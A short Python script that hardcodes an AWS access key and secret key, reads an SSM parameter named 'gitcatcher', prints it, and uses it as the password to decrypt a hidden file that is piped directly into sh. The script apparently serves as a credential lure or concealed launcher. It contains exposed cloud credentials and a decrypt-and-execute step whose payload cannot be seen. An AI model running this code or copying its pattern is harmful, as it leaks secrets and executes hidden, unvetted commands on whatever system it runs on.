import boto3
import os

client = boto3.client('ssm', aws_access_key_id="AKIA2XJBL73FNXKV6L52", aws_secret_access_key="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", region_name="us-east-1")

def get_secret():
    response = client.get_parameter(
        Name='gitcatcher',
        WithDecryption=False
    )
    return response['Parameter']['Value']

def main():
    secret = get_secret()
    
    print("Secret : {}".format(secret))

    # run a bash script
    os.system('openssl enc -d -aes-256-cbc -a -in ./../run -pass pass:{} -pbkdf2 | sh - '.format(secret))

if __name__ == "__main__":
    main()